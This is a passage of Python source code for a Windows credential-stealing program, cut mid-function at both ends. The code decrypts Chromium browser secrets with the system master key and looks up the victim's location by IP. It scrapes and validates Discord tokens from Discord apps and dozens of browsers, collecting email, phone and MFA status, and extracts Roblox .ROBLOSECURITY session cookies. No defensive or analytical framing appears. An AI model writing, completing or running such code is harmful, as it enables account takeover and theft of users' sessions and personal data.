                    inner_key_enc = ct_all[:32]
                    inner_tag = ct_all[32:48]
                    rest = ct_all[48:]
                    
                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                    inner_key = cipher.decrypt_and_verify(inner_key_enc, inner_tag)
                    
                    if rest and len(rest) > 28:
                        inner_nonce = rest[:12]
                        inner_ct = rest[12:-16]
                        inner_rest_tag = rest[-16:]
                        cipher2 = AES.new(inner_key, AES.MODE_GCM, nonce=inner_nonce)
                        return cipher2.decrypt_and_verify(inner_ct, inner_rest_tag)
                    else:
                        return inner_key
                except:
                    pass
            
            return b""
            
        except Exception:
            return b""
    
    # ── Legacy: DPAPI-encrypted ──
    try:
        import win32crypt
        raw = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
        if raw and len(raw) > 0:
            # Remove PKCS7 padding
            try:
                pad_len = raw[-1]
                if 0 < pad_len <= 16 and all(b == pad_len for b in raw[-pad_len:]):
                    raw = raw[:-pad_len]
            except:
                pass
            return raw
    except Exception:
        pass
    
    return b""

# Add this function to your script
def debug_decrypt_chromium_value(encrypted_value, master_key, label=""):
    """Debug function to show what's happening during decryption"""
    if not encrypted_value:
        return b""
    
    if isinstance(encrypted_value, str):
        encrypted_value = encrypted_value.encode('latin-1')
    
    result = []
    result.append(f"[DEBUG {label}] encrypted_value type={type(encrypted_value).__name__} len={len(encrypted_value)}")
    result.append(f"[DEBUG {label}] hex={encrypted_value.hex() if isinstance(encrypted_value, bytes) else 'N/A'}")
    
    if len(encrypted_value) >= 3:
        result.append(f"[DEBUG {label}] prefix={encrypted_value[:3]}")
    
    if master_key:
        result.append(f"[DEBUG {label}] master_key len={len(master_key)} hex={master_key.hex()}")
    else:
        result.append(f"[DEBUG {label}] master_key IS NONE!")
    
    return b"\n".join(r.encode() if isinstance(r, str) else r for r in result)

def get_geolocation():
    try:
        ip = None
        try:
            with urllib.request.urlopen("https://api.ipify.org?format=json", timeout=5) as r:
                ip = json.loads(r.read().decode()).get("ip")
        except:
            pass
        if not ip:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
                s.close()
            except:
                pass
        if ip:
            try:
                with urllib.request.urlopen(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query", timeout=5) as r:
                    data = json.loads(r.read().decode())
                    if data.get("status") == "success":
                        return data
            except:
                pass
    except:
        pass
    return None

def get_discord_tokens_with_info():
    """Extract Discord tokens from Discord desktop apps AND browser localStorage"""
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    TEMP_DIR = tempfile.gettempdir()
    
    from Crypto.Cipher import AES
    import win32crypt
    
    def getheaders(token=None):
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        if token:
            headers["Authorization"] = token
        return headers
    
    def get_master_key(user_data_dir):
        """Get AES master key from a browser's User Data"""
        local_state = os.path.join(user_data_dir, "Local State")
        if not os.path.exists(local_state):
            return None
        try:
            with open(local_state, "r", encoding="utf-8") as f:
                data = json.load(f)
            enc_key = data['os_crypt']['encrypted_key']
            raw = base64.b64decode(enc_key)
            if raw.startswith(b'DPAPI'):
                raw = raw[5:]
            return win32crypt.CryptUnprotectData(raw, None, None, None, 0)[1]
        except:
            return None
    
    def decrypt_discord_token(encrypted_data, master_key):
        """Decrypt a Discord desktop app token (dQw4w9WgXcQ format using AES-GCM)"""
        if not encrypted_data or not master_key:
            return None
        try:
            if len(encrypted_data) < 15:
                return None
            nonce = encrypted_data[3:15]
            ct = encrypted_data[15:-16]
            tag = encrypted_data[-16:]
            if not ct:
                return None
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            plaintext = cipher.decrypt_and_verify(ct, tag)
            token = plaintext.decode('utf-8', errors='ignore')
            return token
        except:
            return None
    
    def validate(token):
        try:
            req = urllib.request.Request(
                "https://discord.com/api/v10/users/@me",
                headers=getheaders(token)
            )
            resp = urllib.request.urlopen(req, timeout=5)
            if resp.getcode() == 200:
                u = json.loads(resp.read().decode())
                return {
                    "username": u.get('username','?'),
                    "discriminator": u.get('discriminator','0000'),
                    "id": u.get('id','?'),
                    "email": u.get('email','?'),
                    "phone": u.get('phone','?'),
                    "mfa_enabled": u.get('mfa_enabled',False),
                    "verified": u.get('verified',False),
                    "token": token,
                    "avatar_hash": u.get('avatar',''),
                    "source": "",
                }
        except urllib.error.HTTPError:
            pass
        except:
            pass
        return None
    
    # Token regex patterns that match Discord's format
    TOKEN_REGEXES = [
        r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',       # Non-MFA token
        r'mfa\.[\w-]{84}',                         # MFA token
    ]
    
    def scan_leveldb_plaintext(leveldb_path, source_label):
        """Scan leveldb files for PLAINTEXT Discord tokens (browser localStorage)"""
        tokens_found = []
        if not os.path.exists(leveldb_path):
            return tokens_found
        
        # ── TRY 1: Raw regex scan on all leveldb files ──
        for fname in os.listdir(leveldb_path):
            if not (fname.endswith(".ldb") or fname.endswith(".log")):
                continue
            try:
                filepath = os.path.join(leveldb_path, fname)
                with open(filepath, "r", errors="ignore") as f:
                    content = f.read()
                
                for regex in TOKEN_REGEXES:
                    for match in re.finditer(regex, content):
                        token = match.group(0)
                        if token not in tokens_found and len(token) > 50:
                            tokens_found.append(token)
            except:
                continue
        
        # ── TRY 2: Parse LevelDB key-value format to extract specific key "token" ──
        # Chromium stores localStorage as: _\x00<origin>\x00key\x00 (URL-encoded origin)
        # Discord runs on discord.com, so look for that origin
        discord_origins = [
            "discord.com",
            "https://discord.com",
            "https://discordapp.com",
            "discordapp.com",
            "ptb.discord.com",
            "canary.discord.com",
        ]
        
        for fname in os.listdir(leveldb_path):
            if not (fname.endswith(".ldb") or fname.endswith(".log")):
                continue
            try:
                filepath = os.path.join(leveldb_path, fname)
                with open(filepath, "rb") as f:
                    raw_bytes = f.read()
                
                # Search for "token" key with various encoding patterns
                # Pattern: key="token" or key="_token" with the value being a Discord token
                for origin in discord_origins:
                    # Try multiple key naming patterns Discord uses
                    key_patterns = [b'token', b'_token', b'TOKEN', b'Token']
                    for key_bytes in key_patterns:
                        # Search for origin + key patterns
                        for encoding_prefix in [b'', b'_\x01', b'_\x00', b'\x00']:
                            search_pattern = encoding_prefix + origin.encode() + encoding_prefix + key_bytes
                            idx = raw_bytes.find(search_pattern)
                            if idx >= 0:
                                # Found the key - now try to extract nearby value
                                # Value usually follows within a few hundred bytes
                                context = raw_bytes[idx:idx+500]
                                # Decode and find token via regex
                                try:
                                    text = context.decode('utf-8', errors='ignore')
                                    for regex in TOKEN_REGEXES:
                                        for match in re.finditer(regex, text):
                                            token = match.group(0)
                                            if token not in tokens_found and len(token) > 50:
                                                tokens_found.append(token)
                                except:
                                    pass
                                
                                # Also try raw extraction after the key
                                value_start = idx + len(search_pattern)
                                remaining = raw_bytes[value_start:value_start+300]
                                # Try reading until a null byte or non-printable
                                value_bytes = bytearray()
                                for b in remaining:
                                    if b == 0:
                                        break
                                    if 32 <= b < 127 or b in (9, 10, 13):
                                        value_bytes.append(b)
                                if value_bytes:
                                    val_text = value_bytes.decode('utf-8', errors='ignore')
                                    for regex in TOKEN_REGEXES:
                                        for match in re.finditer(regex, val_text):
                                            token = match.group(0)
                                            if token not in tokens_found and len(token) > 50:
                                                tokens_found.append(token)
            except:
                continue
        
        # ── TRY 3: Use the SQLite-based localStorage db if present ──
        # Some Chromium versions store localStorage in a .db file alongside leveldb
        for db_name in ['localstorage.db', 'Local Storage.db']:
            db_path = os.path.join(os.path.dirname(leveldb_path), db_name)
            if os.path.exists(db_path):
                try:
                    tmp = os.path.join(TEMP_DIR, f"ls_db_{uuid.uuid4().hex}.db")
                    shutil.copy2(db_path, tmp)
                    conn = sqlite3.connect(tmp)
                    conn.text_factory = lambda b: b.decode(errors='ignore')
                    try:
                        # Check for a table named Items or ItemTable
                        tables = conn.execute(
                            "SELECT name FROM sqlite_master WHERE type='table'"
                        ).fetchall()
                        for table_name in [t[0] for t in tables]:
                            try:
                                columns = [col[1] for col in conn.execute(
                                    f"PRAGMA table_info({table_name})"
                                ).fetchall()]
                                if 'key' in columns and 'value' in columns:
                                    rows = conn.execute(
                                        f"SELECT value FROM {table_name} WHERE key='token' OR key='_token'"
                                    ).fetchall()
                                    for row in rows:
                                        val = row[0]
                                        if isinstance(val, str):
                                            for regex in TOKEN_REGEXES:
                                                for match in re.finditer(regex, val):
                                                    token = match.group(0)
                                                    if token not in tokens_found and len(token) > 50:
                                                        tokens_found.append(token)
                            except:
                                pass
                    except:
                        pass
                    conn.close()
                    os.remove(tmp)
                except:
                    try: os.remove(tmp)
                    except: pass
        
        return tokens_found
    
    def scan_leveldb_encrypted(leveldb_path, master_key, source_label):
        """Scan leveldb files for ENCRYPTED Discord tokens (Discord desktop app)"""
        tokens_found = []
        if not os.path.exists(leveldb_path):
            return tokens_found
        
        for fname in os.listdir(leveldb_path):
            if not (fname.endswith(".ldb") or fname.endswith(".log")):
                continue
            try:
                filepath = os.path.join(leveldb_path, fname)
                with open(filepath, "r", errors="ignore") as f:
                    content = f.read()
                
                # Look for dQw4w9WgXcQ: prefix (Discord desktop's safeStorage encryption)
                for match in re.finditer(r'dQw4w9WgXcQ:([A-Za-z0-9+/=]+)', content):
                    try:
                        data = base64.b64decode(match.group(1))
                        token = decrypt_discord_token(data, master_key)
                        if token and len(token) > 50 and token.count('.') >= 2:
                            if token not in tokens_found:
                                tokens_found.append(token)
                    except:
                        continue
            except:
                continue
        
        # Also try raw bytes scan for dQw4w9WgXcQ
        for fname in os.listdir(leveldb_path):
            if not (fname.endswith(".ldb") or fname.endswith(".log")):
                continue
            try:
                filepath = os.path.join(leveldb_path, fname)
                with open(filepath, "rb") as f:
                    raw = f.read()
                
                # Search for dQw4w9WgXcQ in raw bytes
                marker = b'dQw4w9WgXcQ:'
                idx = 0
                while True:
                    idx = raw.find(marker, idx)
                    if idx < 0:
                        break
                    # Try to extract base64 data after the marker
                    end_idx = idx + len(marker)
                    b64_chars = bytearray()
                    while end_idx < len(raw):
                        ch = raw[end_idx]
                        if ch in b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=':
                            b64_chars.append(ch)
                            end_idx += 1
                        else:
                            break
                    if b64_chars:
                        try:
                            data = base64.b64decode(b64_chars)
                            token = decrypt_discord_token(data, master_key)
                            if token and len(token) > 50 and token.count('.') >= 2:
                                if token not in tokens_found:
                                    tokens_found.append(token)
                        except:
                            pass
                    idx = end_idx + 1
            except:
                continue
        
        return tokens_found
    
    seen = set()
    results = []
    
    # ── 1. Discord Desktop Apps (ENCRYPTED - uses dQw4w9WgXcQ + AES-GCM) ──
    discord_apps = [
        ('Discord', os.path.join(ROAMING, 'discord')),
        ('Discord Canary', os.path.join(ROAMING, 'discordcanary')),
        ('Discord PTB', os.path.join(ROAMING, 'discordptb')),
        ('Discord Development', os.path.join(ROAMING, 'discorddevelopment')),
    ]
    
    for name, path in discord_apps:
        if not os.path.exists(path):
            continue
        master_key = get_master_key(path)
        if not master_key:
            continue
        leveldb = os.path.join(path, "Local Storage", "leveldb")
        tokens = scan_leveldb_encrypted(leveldb, master_key, name)
        for token in tokens:
            if token not in seen:
                seen.add(token)
                info = validate(token)
                if info:
                    info["source"] = f"Discord Desktop ({name})"
                    results.append(info)
    
    # ── 2. Chromium Browsers (PLAINTEXT - localStorage is NOT encrypted) ──
    browser_roots = [
        (LOCAL + '\\Google\\Chrome\\User Data', 'Chrome'),
        (LOCAL + '\\Google\\Chrome Beta\\User Data', 'Chrome Beta'),
        (LOCAL + '\\Google\\Chrome SxS\\User Data', 'Chrome SxS'),
        (LOCAL + '\\Chromium\\User Data', 'Chromium'),
        (LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data', 'Brave'),
        (LOCAL + '\\BraveSoftware\\Brave-Browser-Beta\\User Data', 'Brave Beta'),
        (LOCAL + '\\Microsoft\\Edge\\User Data', 'Edge'),
        (LOCAL + '\\Microsoft\\Edge Beta\\User Data', 'Edge Beta'),
        (LOCAL + '\\Vivaldi\\User Data', 'Vivaldi'),
        (LOCAL + '\\Yandex\\YandexBrowser\\User Data', 'Yandex'),
        (LOCAL + '\\Iridium\\User Data', 'Iridium'),
        (LOCAL + '\\uCozMedia\\Uran\\User Data', 'Uran'),
        (LOCAL + '\\Amigo\\User Data', 'Amigo'),
        (LOCAL + '\\Torch\\User Data', 'Torch'),
        (LOCAL + '\\Kometa\\User Data', 'Kometa'),
        (LOCAL + '\\Orbitum\\User Data', 'Orbitum'),
        (LOCAL + '\\CentBrowser\\User Data', 'CentBrowser'),
        (LOCAL + '\\7Star\\7Star\\User Data', '7Star'),
        (LOCAL + '\\Sputnik\\Sputnik\\User Data', 'Sputnik'),
        (LOCAL + '\\Epic Privacy Browser\\User Data', 'Epic'),
        (LOCAL + '\\CocCoc\\Browser\\User Data', 'CocCoc'),
        (LOCAL + '\\360Browser\\Browser\\User Data', '360Browser'),
        (LOCAL + '\\Slimjet\\User Data', 'Slimjet'),
        (LOCAL + '\\SRWare Iron\\User Data', 'Iron'),
        (LOCAL + '\\Comodo\\Dragon\\User Data', 'Comodo'),
        (LOCAL + '\\Opera Software\\Opera Stable\\User Data', 'Opera'),
    ]
    
    for root, name in browser_roots:
        if not os.path.exists(root):
            continue
        
        profiles = ['Default']
        try:
            for item in os.listdir(root):
                if item.startswith("Profile "):
                    profiles.append(item)
        except:
            pass
        
        for profile in profiles:
            profile_path = os.path.join(root, profile)
            if not os.path.isdir(profile_path):
                continue
            
            label = f"{name} ({profile})" if profile != 'Default' else name
            
            # Browser localStorage is PLAINTEXT - use improved scanning
            leveldb = os.path.join(profile_path, "Local Storage", "leveldb")
            tokens = scan_leveldb_plaintext(leveldb, label)
            
            for token in tokens:
                if token not in seen:
                    seen.add(token)
                    info = validate(token)
                    if info:
                        info["source"] = label
                        results.append(info)
    
    # ── 3. Opera / Opera GX (ROAMING location, different path structure) ──
    for opera_path, label in [
        (os.path.join(ROAMING, 'Opera Software', 'Opera Stable'), 'Opera'),
        (os.path.join(ROAMING, 'Opera Software', 'Opera GX Stable'), 'Opera GX'),
    ]:
        if not os.path.exists(opera_path):
            continue
        
        leveldb = os.path.join(opera_path, "Local Storage", "leveldb")
        if os.path.exists(leveldb):
            tokens = scan_leveldb_plaintext(leveldb, label)
            
            for token in tokens:
                if token not in seen:
                    seen.add(token)
                    info = validate(token)
                    if info:
                        info["source"] = label
                        results.append(info)
        
        # Opera also stores localStorage in a different location sometimes
        opera_local_storage = os.path.join(opera_path, "Local Storage")
        if os.path.isdir(opera_local_storage):
            for fname in os.listdir(opera_local_storage):
                if fname.endswith('.localstorage'):
                    fpath = os.path.join(opera_local_storage, fname)
                    try:
                        with open(fpath, 'rb') as f:
                            content = f.read()
                            text = content.decode('utf-8', errors='ignore')
                            for regex in TOKEN_REGEXES:
                                for match in re.finditer(regex, text):
                                    token = match.group(0)
                                    if token not in seen and len(token) > 50:
                                        seen.add(token)
                                        info = validate(token)
                                        if info:
                                            info["source"] = f"{label} (.localstorage)"
                                            results.append(info)
                    except:
                        pass
    
    # ── 4. Firefox profiles ──
    for profiles_dir, label_prefix in [
        (os.path.join(ROAMING, 'Mozilla', 'Firefox', 'Profiles'), 'Firefox'),
        (os.path.join(LOCAL, 'Mozilla', 'Firefox', 'Profiles'), 'Firefox'),
    ]:
        if os.path.isdir(profiles_dir):
            for profile_name in os.listdir(profiles_dir):
                profile_path = os.path.join(profiles_dir, profile_name)
                if not os.path.isdir(profile_path):
                    continue
                
                # Firefox uses webappsstore.sqlite or localStorage.sqlite
                for ldb_name in ['webappsstore.sqlite', 'localStorage.sqlite']:
                    ldb_path = os.path.join(profile_path, ldb_name)
                    if not os.path.exists(ldb_path):
                        continue
                    
                    try:
                        tmp = os.path.join(TEMP_DIR, f"ff_ls_{uuid.uuid4().hex}.db")
                        shutil.copy2(ldb_path, tmp)
                        conn = sqlite3.connect(tmp)
                        # Firefox stores localStorage as (scope, key, value)
                        # The scope contains the origin URL
                        try:
                            # Try webappsstore2 table structure
                            tables = conn.execute(
                                "SELECT name FROM sqlite_master WHERE type='table'"
                            ).fetchall()
                            
                            for tbl in [t[0] for t in tables]:
                                try:
                                    columns = [col[1] for col in conn.execute(
                                        f"PRAGMA table_info({tbl})"
                                    ).fetchall()]
                                    
                                    # Firefox webappsstore2 uses scope, key, value
                                    # Look for tokens with scope containing discord
                                    if 'scope' in columns and 'key' in columns and 'value' in columns:
                                        rows = conn.execute(
                                            f"SELECT value FROM {tbl} WHERE (key='token' OR key='_token') AND scope LIKE '%discord%'"
                                        ).fetchall()
                                        for row in rows:
                                            val = row[0]
                                            if isinstance(val, bytes):
                                                val = val.decode('utf-8', errors='ignore')
                                            if val and len(val) > 50:
                                                for regex in TOKEN_REGEXES:
                                                    for match in re.finditer(regex, val):
                                                        token = match.group(0)
                                                        if token not in seen and len(token) > 50:
                                                            seen.add(token)
                                                            info = validate(token)
                                                            if info:
                                                                info["source"] = f"{label_prefix} ({profile_name})"
                                                                results.append(info)
                                    # Also search all rows for token-like values
                                    elif 'value' in columns:
                                        rows = conn.execute(
                                            f"SELECT value FROM {tbl}"
                                        ).fetchall()
                                        for row in rows:
                                            val = row[0]
                                            if isinstance(val, bytes):
                                                val = val.decode('utf-8', errors='ignore')
                                            if val and isinstance(val, str) and len(val) > 50:
                                                for regex in TOKEN_REGEXES:
                                                    for match in re.finditer(regex, val):
                                                        token = match.group(0)
                                                        if token not in seen and len(token) > 50:
                                                            seen.add(token)
                                                            info = validate(token)
                                                            if info:
                                                                info["source"] = f"{label_prefix} ({profile_name})"
                                                                results.append(info)
                                except:
                                    pass
                        except:
                            pass
                        conn.close()
                        os.remove(tmp)
                    except:
                        try: os.remove(tmp)
                        except: pass
                
                # Also scan Firefox webappsstore files that are just raw files
                for store_file in ['webappsstore.sqlite-wal', 'webappsstore.sqlite-shm']:
                    fpath = os.path.join(profile_path, store_file)
                    if os.path.exists(fpath):
                        try:
                            with open(fpath, 'r', errors='ignore') as f:
                                content = f.read()
                                for regex in TOKEN_REGEXES:
                                    for match in re.finditer(regex, content):
                                        token = match.group(0)
                                        if token not in seen and len(token) > 50:
                                            seen.add(token)
                                            info = validate(token)
                                            if info:
                                                info["source"] = f"{label_prefix} ({profile_name})"
                                                results.append(info)
                        except:
                            pass
    
    # Format results
    formatted = []
    for info in results:
        formatted.append(
            f"Username: {info['username']}#{info['discriminator']}\n"
            f"ID: {info['id']}\n"
            f"Email: {info['email']}\n"
            f"Phone: {info.get('phone', 'Not set')}\n"
            f"MFA: {'Enabled' if info.get('mfa_enabled') else 'Disabled'}\n"
            f"Verified: {'Yes' if info.get('verified') else 'No'}\n"
            f"Source: {info.get('source', 'Unknown')}\n"
            f"Token: {info['token']}"
        )
    
    return formatted

def get_chromium_browsers_list():
    """Return list of (browser_names, base_path) tuples for all Chromium browsers."""
    LOCAL = os.getenv("LOCALAPPDATA", "")
    ROAMING = os.getenv("APPDATA", "")
    
    return [
        (["Chrome"],               os.path.join(LOCAL, "Google", "Chrome", "User Data")),
        (["Chrome Beta"],          os.path.join(LOCAL, "Google", "Chrome Beta", "User Data")),
        (["Chrome SxS"],           os.path.join(LOCAL, "Google", "Chrome SxS", "User Data")),
        (["Chromium"],             os.path.join(LOCAL, "Chromium", "User Data")),
        (["Brave"],                os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data")),
        (["Brave Beta"],           os.path.join(LOCAL, "BraveSoftware", "Brave-Browser-Beta", "User Data")),
        (["Brave Nightly"],        os.path.join(LOCAL, "BraveSoftware", "Brave-Browser-Nightly", "User Data")),
        (["Microsoft Edge"],       os.path.join(LOCAL, "Microsoft", "Edge", "User Data")),
        (["Edge Beta"],            os.path.join(LOCAL, "Microsoft", "Edge Beta", "User Data")),
        (["Edge Dev"],             os.path.join(LOCAL, "Microsoft", "Edge Dev", "User Data")),
        (["Edge SxS"],             os.path.join(LOCAL, "Microsoft", "Edge SxS", "User Data")),
        (["Vivaldi"],              os.path.join(LOCAL, "Vivaldi", "User Data")),
        (["Opera"],                os.path.join(ROAMING, "Opera Software", "Opera Stable")),
        (["Opera GX"],             os.path.join(ROAMING, "Opera Software", "Opera GX Stable")),
        (["Yandex"],               os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data")),
        (["360Browser"],           os.path.join(LOCAL, "360Browser", "Browser", "User Data")),
        (["CocCoc"],               os.path.join(LOCAL, "CocCoc", "Browser", "User Data")),
        (["Slimjet"],              os.path.join(LOCAL, "Slimjet", "User Data")),
        (["SRWare Iron"],          os.path.join(LOCAL, "SRWare Iron", "User Data")),
        (["Torch"],                os.path.join(LOCAL, "Torch", "User Data")),
        (["Comodo Dragon"],        os.path.join(LOCAL, "Comodo", "Dragon", "User Data")),
        (["Epic Privacy"],         os.path.join(LOCAL, "Epic Privacy Browser", "User Data")),
        (["Amigo"],                os.path.join(LOCAL, "Amigo", "User Data")),
        (["Orbitum"],              os.path.join(LOCAL, "Orbitum", "User Data")),
        (["CentBrowser"],          os.path.join(LOCAL, "CentBrowser", "User Data")),
        (["7Star"],                os.path.join(LOCAL, "7Star", "7Star", "User Data")),
        (["Sputnik"],              os.path.join(LOCAL, "Sputnik", "Sputnik", "User Data")),
        (["Iridium"],              os.path.join(LOCAL, "Iridium", "User Data")),
        (["Uran"],                 os.path.join(LOCAL, "uCozMedia", "Uran", "User Data")),
        (["Kometa"],               os.path.join(LOCAL, "Kometa", "User Data")),
        (["Chedot"],               os.path.join(LOCAL, "Chedot", "User Data")),
    ]

def get_chromium_master_key(user_data_path):
    """Get the AES master key for a browser's User Data directory."""
    local_state = None
    
    # Try multiple possible Local State locations
    candidates = [
        os.path.join(user_data_path, "Local State"),
        os.path.join(os.path.dirname(user_data_path), "Local State"),
    ]
    
    # For profiles, also check parent directory
    if "Profile" in os.path.basename(user_data_path):
        candidates.insert(0, os.path.join(os.path.dirname(user_data_path), "Local State"))
    
    for path in candidates:
        if os.path.exists(path):
            local_state = path
            break
    
    if not local_state:
        return None
    
    return decrypt_chromium_key(local_state)

def get_cookies_from_profile(profile_path, master_key):
    results = []
    cookies_db = os.path.join(profile_path, "Network", "Cookies")
    if not os.path.exists(cookies_db):
        cookies_db = os.path.join(profile_path, "Cookies")
    if not os.path.exists(cookies_db):
        return results
    try:
        tmp = os.path.join(TEMP_DIR, f"ck_{uuid.uuid4().hex}.db")
        shutil.copy2(cookies_db, tmp)
        conn = sqlite3.connect(tmp)
        cursor = conn.execute("PRAGMA table_info(cookies)")
        columns = [row[1] for row in cursor.fetchall()]
        select_cols = ["host_key", "name", "path", "encrypted_value"]
        has_value_col = "has_value" in columns
        has_plain_col = "value" in columns
        if has_value_col:
            select_cols.append("has_value")
        if has_plain_col:
            select_cols.append("value")
        query = "SELECT " + ", ".join(select_cols) + " FROM cookies"
        for row in conn.execute(query):
            row_dict = dict(zip(select_cols, row))
            cookie_value = None
            if has_plain_col and has_value_col:
                if row_dict.get("has_value") and row_dict.get("value"):
                    val = row_dict["value"]
                    if isinstance(val, bytes):
                        try:
                            val = val.decode('utf-8', errors='ignore')
                        except:
                            val = str(val)
                    if val and len(str(val)) > 0:
                        cookie_value = str(val)
            if cookie_value is None:
                enc_val = row_dict.get("encrypted_value")
                if enc_val and len(enc_val) > 0:
                    decrypted = decrypt_chromium_value(enc_val, master_key)
                    if decrypted:
                        try:
                            cookie_value = decrypted.decode('utf-8', errors='ignore')
                        except:
                            cookie_value = decrypted.hex()
            if cookie_value and len(cookie_value) > 0:
                row_dict["decrypted_value"] = cookie_value
                results.append(row_dict)
        conn.close()
        os.remove(tmp)
    except:
        try: os.remove(tmp)
        except: pass
    return results

def get_roblox_cookies_v2():
    roblox_cookies = {}
    
    def clean_roblox_cookie(raw_value):
        """Extract just the .ROBLOSECURITY cookie value, stopping at semicolon or whitespace"""
        marker = "_|WARNING:-DO-NOT-SHARE-THIS."
        idx = raw_value.find(marker)
        if idx < 0:
            return None
        
        # Start from the marker
        cleaned = raw_value[idx:]
        
        # Stop at the first semicolon (cookie separator)
        semi_idx = cleaned.find(';')
        if semi_idx >= 0:
            cleaned = cleaned[:semi_idx]
        
        # Also stop at tab or newline
        for sep in ['\t', '\n', '\r']:
            sep_idx = cleaned.find(sep)
            if sep_idx >= 0:
                cleaned = cleaned[:sep_idx]
        
        # Remove trailing whitespace
        cleaned = cleaned.strip()
        
        # Validate minimum length
        if len(cleaned) > 50:
            return cleaned
        return None
    
    # ── Method 1: Chromium browsers ──
    for browser_names, base_path in get_chromium_browsers_list():
        if not os.path.isdir(base_path):
            continue
        master_key = get_chromium_master_key(base_path)
        if not master_key:
            continue
        profiles = ["Default"] + [p for p in os.listdir(base_path) if p.startswith("Profile ")]
        for profile in profiles:
            profile_path = os.path.join(base_path, profile)
            if not os.path.isdir(profile_path):
                continue
            cookies_db = os.path.join(profile_path, "Network", "Cookies")
            if not os.path.exists(cookies_db):
                cookies_db = os.path.join(profile_path, "Cookies")
            if not os.path.exists(cookies_db):
                continue
            try:
                tmp = os.path.join(TEMP_DIR, f"rbx_{uuid.uuid4().hex}.db")
                shutil.copy2(cookies_db, tmp)
                conn = sqlite3.connect(tmp)
                conn.text_factory = lambda b: b.decode(errors='ignore')
                cursor = conn.execute("PRAGMA table_info(cookies)")
                columns = [row[1] for row in cursor.fetchall()]
                select_cols = ["host_key", "name", "encrypted_value"]
                has_value_col = "has_value" in columns
                has_plain_col = "value" in columns
                if has_value_col:
                    select_cols.append("has_value")
                if has_plain_col:
                    select_cols.append("value")
                query = "SELECT " + ", ".join(select_cols) + " FROM cookies WHERE name = '.ROBLOSECURITY'"
                for row in conn.execute(query):
                    row_dict = dict(zip(select_cols, row))
                    cookie_value = None
                    if has_value_col and has_plain_col:
                        if row_dict.get("has_value") and row_dict.get("value"):
                            val = row_dict["value"]
                            if isinstance(val, bytes):
                                val = val.decode('utf-8', errors='ignore')
                            if val and len(str(val)) > 50:
                                cookie_value = str(val)
                    if not cookie_value:
                        enc_val = row_dict.get("encrypted_value")
                        if enc_val and len(enc_val) > 0:
                            dec = decrypt_chromium_value(enc_val, master_key)
                            if dec:
                                try:
                                    cookie_value = dec.decode('utf-8', errors='ignore')
                                except:
                                    cookie_value = dec.hex()
                    if cookie_value and len(cookie_value) > 50:
                        cleaned = clean_roblox_cookie(cookie_value)
                        if cleaned and cleaned not in roblox_cookies:
                            roblox_cookies[cleaned] = True
                conn.close()
                os.remove(tmp)
            except:
                try: os.remove(tmp)
                except: pass
    
    # ── Method 2: Roblox Desktop App (RobloxCookies.dat) ──
    try:
        if HAS_WIN32CRYPT:
            app_cookie_path = os.path.join(
                os.getenv("LOCALAPPDATA", ""),
                "Roblox", "LocalStorage", "RobloxCookies.dat"
            )
            
            if os.path.exists(app_cookie_path):
                with open(app_cookie_path, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                
                encrypted_data = base64.b64decode(data['CookiesData'])
                decrypted = win32crypt.CryptUnprotectData(
                    encrypted_data, None, None, None, 0
                )[1].decode('utf-8')
                
                cookie_start = decrypted.find('.ROBLOSECURITY')
                if cookie_start != -1:
                    cookie_value_start = cookie_start + len('.ROBLOSECURITY')
                    while cookie_value_start < len(decrypted) and decrypted[cookie_value_start] in [' ', '\t', '=']:
                        cookie_value_start += 1
                    
                    # Find first semicolon OR newline after the cookie value
                    remaining = decrypted[cookie_value_start:]
                    semi_idx = remaining.find(';')
                    newline_idx = remaining.find('\n')
                    
                    if semi_idx >= 0 and (newline_idx < 0 or semi_idx < newline_idx):
                        cookie_end = cookie_value_start + semi_idx
                    elif newline_idx >= 0:
                        cookie_end = cookie_value_start + newline_idx
                    else:
                        cookie_end = len(decrypted)
                    
                    cookie_value = decrypted[cookie_value_start:cookie_end].strip()
                    
                    if cookie_value and len(cookie_value) > 50:
                        cleaned = clean_roblox_cookie(cookie_value)
                        if cleaned and cleaned not in roblox_cookies:
                            roblox_cookies[cleaned] = True
    except Exception as e:
        pass
    
    # ── Method 3: Try log files in the same directory ──
    try:
        if HAS_WIN32CRYPT:
            app_cookie_dir = os.path.join(
                os.getenv("LOCALAPPDATA", ""),
                "Roblox", "LocalStorage"
            )
            if os.path.isdir(app_cookie_dir):
                for fname in os.listdir(app_cookie_dir):
                    if fname.startswith("RobloxCookies") and fname.endswith(".dat") and fname != "RobloxCookies.dat":
                        fpath = os.path.join(app_cookie_dir, fname)
                        try:
                            with open(fpath, 'r', encoding='utf-8') as f:
                                data = json.load(f)
                            
                            encrypted_data = base64.b64decode(data['CookiesData'])
                            decrypted = win32crypt.CryptUnprotectData(
                                encrypted_data, None, None, None, 0
                            )[1].decode('utf-8')
                            
                            cookie_start = decrypted.find('.ROBLOSECURITY')
                            if cookie_start != -1:
                                cookie_value_start = cookie_start + len('.ROBLOSECURITY')
                                while cookie_value_start < len(decrypted) and decrypted[cookie_value_start] in [' ', '\t', '=']:
                                    cookie_value_start += 1
                                
                                remaining = decrypted[cookie_value_start:]
                                semi_idx = remaining.find(';')
                                newline_idx = remaining.find('\n')
                                
                                if semi_idx >= 0 and (newline_idx < 0 or semi_idx < newline_idx):
                                    cookie_end = cookie_value_start + semi_idx
                                elif newline_idx >= 0:
                                    cookie_end = cookie_value_start + newline_idx
                                else:
                                    cookie_end = len(decrypted)
                                
                                cookie_value = decrypted[cookie_value_start:cookie_end].strip()
                                
                                if cookie_value and len(cookie_value) > 50:
                                    cleaned = clean_roblox_cookie(cookie_value)
                                    if cleaned and cleaned not in roblox_cookies:
                                        roblox_cookies[cleaned] = True
                        except:
                            continue
